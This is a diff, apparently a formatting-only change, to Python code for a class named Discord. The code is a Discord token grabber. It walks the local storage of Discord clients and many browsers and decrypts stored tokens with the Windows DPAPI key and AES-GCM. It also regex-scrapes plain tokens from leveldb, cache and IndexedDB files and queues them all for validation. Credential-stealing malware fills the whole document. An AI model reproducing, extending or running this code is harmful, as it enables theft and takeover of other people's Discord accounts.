@@ -24,30 +24,47 @@ class Discord:
         self.appdata_path: str = os.getenv("LOCALAPPDATA")
         self.local_storage_paths: Dict[str, str] = {
             "discord": self.roaming_path + "\\discord\\Local Storage\\leveldb\\",
-            "discordcanary": self.roaming_path + "\\discordcanary\\Local Storage\\leveldb\\",
+            "discordcanary": self.roaming_path
+            + "\\discordcanary\\Local Storage\\leveldb\\",
             "lightcord": self.roaming_path + "\\Lightcord\\Local Storage\\leveldb\\",
             "discordptb": self.roaming_path + "\\discordptb\\Local Storage\\leveldb\\",
             "vesktop": self.roaming_path + "\\Vesktop\\Local Storage\\leveldb\\",
             "equibop": self.roaming_path + "\\equibop\\Local Storage\\leveldb\\",
-            "opera": self.roaming_path + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
-            "operagx": self.roaming_path + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
+            "opera": self.roaming_path
+            + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
+            "operagx": self.roaming_path
+            + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
             "firefox": self.roaming_path + "\\Mozilla\\Firefox\\Profiles",
             "amigo": self.appdata_path + "\\Amigo\\User Data\\Local Storage\\leveldb\\",
             "torch": self.appdata_path + "\\Torch\\User Data\\Local Storage\\leveldb\\",
-            "kometa": self.appdata_path + "\\Kometa\\User Data\\Local Storage\\leveldb\\",
-            "orbitum": self.appdata_path + "\\Orbitum\\User Data\\Local Storage\\leveldb\\",
-            "centbrowser": self.appdata_path + "\\CentBrowser\\User Data\\Local Storage\\leveldb\\",
-            "7star": self.appdata_path + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\",
-            "sputnik": self.appdata_path + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\",
-            "vivaldi": self.appdata_path + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\",
-            "chromesxs": self.appdata_path + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\",
-            "chrome": self.appdata_path + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
-            "epicprivacybrowser": self.appdata_path + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\",
-            "microsoftedge": self.appdata_path + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\",
-            "uran": self.appdata_path + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\",
-            "yandex": self.appdata_path + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
-            "brave": self.appdata_path + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
-            "iridium": self.appdata_path + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\"
+            "kometa": self.appdata_path
+            + "\\Kometa\\User Data\\Local Storage\\leveldb\\",
+            "orbitum": self.appdata_path
+            + "\\Orbitum\\User Data\\Local Storage\\leveldb\\",
+            "centbrowser": self.appdata_path
+            + "\\CentBrowser\\User Data\\Local Storage\\leveldb\\",
+            "7star": self.appdata_path
+            + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\",
+            "sputnik": self.appdata_path
+            + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\",
+            "vivaldi": self.appdata_path
+            + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\",
+            "chromesxs": self.appdata_path
+            + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\",
+            "chrome": self.appdata_path
+            + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
+            "epicprivacybrowser": self.appdata_path
+            + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\",
+            "microsoftedge": self.appdata_path
+            + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\",
+            "uran": self.appdata_path
+            + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\",
+            "yandex": self.appdata_path
+            + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
+            "brave": self.appdata_path
+            + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
+            "iridium": self.appdata_path
+            + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\",
         }
 
     def resolve_local_storage_path(self, platform: str) -> Optional[str]:
@@ -114,9 +131,7 @@ class Discord:
         except:
             return None
 
-    def get_token(
-        self, content: str, decryption_key: bytes
-    ) -> Optional[str]:
+    def get_token(self, content: str, decryption_key: bytes) -> Optional[str]:
         """Extract encrypted token from content. Returns decrypted token string or None."""
         for line in content.split("\n"):
             for match in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
@@ -135,7 +150,7 @@ class Discord:
         discord_accounts: Dict[str, Dict[str, Union[str, bool]]] = {}
         tokens_to_validate: List[str] = []
         seen_tokens: set = set()
-        
+
         # First pass: collect all tokens from all locations
         for platform, path in self.local_storage_paths.items():
             resolved_path: Optional[str] = self.resolve_local_storage_path(platform)
@@ -158,9 +173,9 @@ class Discord:
                     try:
                         with open(local_state_path, "r", encoding="utf-8") as f:
                             content: str = f.read()
-                            encrypted_decryption_key: str = json.loads(content)["os_crypt"][
-                                "encrypted_key"
-                            ]
+                            encrypted_decryption_key: str = json.loads(content)[
+                                "os_crypt"
+                            ]["encrypted_key"]
                             decryption_key: bytes = CryptUnprotectData(
                                 base64.b64decode(encrypted_decryption_key)[5:]
                             )[1]
@@ -175,23 +190,31 @@ class Discord:
                     try:
                         with open(os.path.join(path, file), "r", errors="ignore") as f:
                             content: str = f.read()
-                            
+
                             # Collect encrypted tokens
                             for match in re.findall(r"dQw4w9WgXcQ:[^\"]*", content):
                                 try:
-                                    encrypted_token: bytes = base64.b64decode(match.split(":")[1])
+                                    encrypted_token: bytes = base64.b64decode(
+                                        match.split(":")[1]
+                                    )
                                     iv: bytes = encrypted_token[3:15]
                                     payload: bytes = encrypted_token[15:]
-                                    cipher: GcmMode = AES.new(decryption_key, AES.MODE_GCM, iv)
-                                    decrypted_token: str = cipher.decrypt(payload)[:-16].decode()
+                                    cipher: GcmMode = AES.new(
+                                        decryption_key, AES.MODE_GCM, iv
+                                    )
+                                    decrypted_token: str = cipher.decrypt(payload)[
+                                        :-16
+                                    ].decode()
                                     if decrypted_token not in seen_tokens:
                                         tokens_to_validate.append(decrypted_token)
                                         seen_tokens.add(decrypted_token)
                                 except:
                                     pass
-                            
+
                             # Collect plain Discord tokens
-                            for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", content):
+                            for token in re.findall(
+                                r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", content
+                            ):
                                 if token not in seen_tokens:
                                     tokens_to_validate.append(token)
                                     seen_tokens.add(token)
@@ -201,18 +224,27 @@ class Discord:
                 # For equibop/vesktop, also collect from Cache and IndexedDB
                 if platform in ["equibop", "vesktop"]:
                     session_data_path: str = os.path.dirname(os.path.dirname(path))
-                    
+
                     # Search Cache_Data directory
-                    cache_data_path: str = os.path.join(session_data_path, "Cache", "Cache_Data")
+                    cache_data_path: str = os.path.join(
+                        session_data_path, "Cache", "Cache_Data"
+                    )
                     if os.path.exists(cache_data_path):
                         try:
                             for file in os.listdir(cache_data_path):
                                 if not file.startswith("f_"):
                                     continue
                                 try:
-                                    with open(os.path.join(cache_data_path, file), "r", errors="ignore") as f:
+                                    with open(
+                                        os.path.join(cache_data_path, file),
+                                        "r",
+                                        errors="ignore",
+                                    ) as f:
                                         content: str = f.read()
-                                        for token in re.findall(r"MTk[A-Za-z0-9_-]{20,}\.[\w-]{6}\.[\w-]{25,110}", content):
+                                        for token in re.findall(
+                                            r"MTk[A-Za-z0-9_-]{20,}\.[\w-]{6}\.[\w-]{25,110}",
+                                            content,
+                                        ):
                                             if token not in seen_tokens:
                                                 tokens_to_validate.append(token)
                                                 seen_tokens.add(token)
@@ -220,18 +252,31 @@ class Discord:
                                     pass
                         except:
                             pass
-                    
+
                     # Search IndexedDB directory
-                    indexed_db_path: str = os.path.join(session_data_path, "IndexedDB", "https_discord.com_0.indexeddb.leveldb")
+                    indexed_db_path: str = os.path.join(
+                        session_data_path,
+                        "IndexedDB",
+                        "https_discord.com_0.indexeddb.leveldb",
+                    )
                     if os.path.exists(indexed_db_path):
                         try:
                             for file in os.listdir(indexed_db_path):
-                                if not file.endswith(".log") and not file.endswith(".ldb"):
+                                if not file.endswith(".log") and not file.endswith(
+                                    ".ldb"
+                                ):
                                     continue
                                 try:
-                                    with open(os.path.join(indexed_db_path, file), "r", errors="ignore") as f:
+                                    with open(
+                                        os.path.join(indexed_db_path, file),
+                                        "r",
+                                        errors="ignore",
+                                    ) as f:
                                         content: str = f.read()
-                                        for token in re.findall(r"MTk[A-Za-z0-9_-]{20,}\.[\w-]{6}\.[\w-]{25,110}", content):
+                                        for token in re.findall(
+                                            r"MTk[A-Za-z0-9_-]{20,}\.[\w-]{6}\.[\w-]{25,110}",
+                                            content,
+                                        ):
                                             if token not in seen_tokens:
                                                 tokens_to_validate.append(token)
                                                 seen_tokens.add(token)
@@ -249,7 +294,9 @@ class Discord:
                                 continue
 
                             try:
-                                with open(f"{_path}\\{file}", "r", errors="ignore") as f:
+                                with open(
+                                    f"{_path}\\{file}", "r", errors="ignore"
+                                ) as f:
                                     content: str = f.read()
 
                                     for token in re.findall(
@@ -269,7 +316,9 @@ class Discord:
                     if "User Data\\Default" in path:
                         profiles: List[str] = ["Default"]
 
-                        user_data_path: str = path.split("User Data\\")[0] + "User Data\\"
+                        user_data_path: str = (
+                            path.split("User Data\\")[0] + "User Data\\"
+                        )
                         for file in os.listdir(user_data_path):
                             if file.startswith("Profile"):
                                 profiles.append(file)
@@ -280,15 +329,20 @@ class Discord:
                                     f"{user_data_path}{profile}\\Local Storage\\leveldb\\"
                                 ):
                                     for file in files:
-                                        if not file.endswith(".log") and not file.endswith(".ldb"):
+                                        if not file.endswith(
+                                            ".log"
+                                        ) and not file.endswith(".ldb"):
                                             continue
 
                                         try:
-                                            with open(f"{_path}{file}", "r", errors="ignore") as f:
+                                            with open(
+                                                f"{_path}{file}", "r", errors="ignore"
+                                            ) as f:
                                                 content: str = f.read()
 
                                                 for token in re.findall(
-                                                    r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", content
+                                                    r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}",
+                                                    content,
                                                 ):
                                                     if token not in seen_tokens:
                                                         tokens_to_validate.append(token)
@@ -303,8 +357,11 @@ class Discord:
         # Second pass: validate all tokens in parallel
         if tokens_to_validate:
             with ThreadPoolExecutor(max_workers=5) as executor:
-                futures = {executor.submit(self.validate_token, token): token for token in tokens_to_validate}
-                
+                futures = {
+                    executor.submit(self.validate_token, token): token
+                    for token in tokens_to_validate
+                }
+
                 for future in as_completed(futures):
                     try:
                         data = future.result()
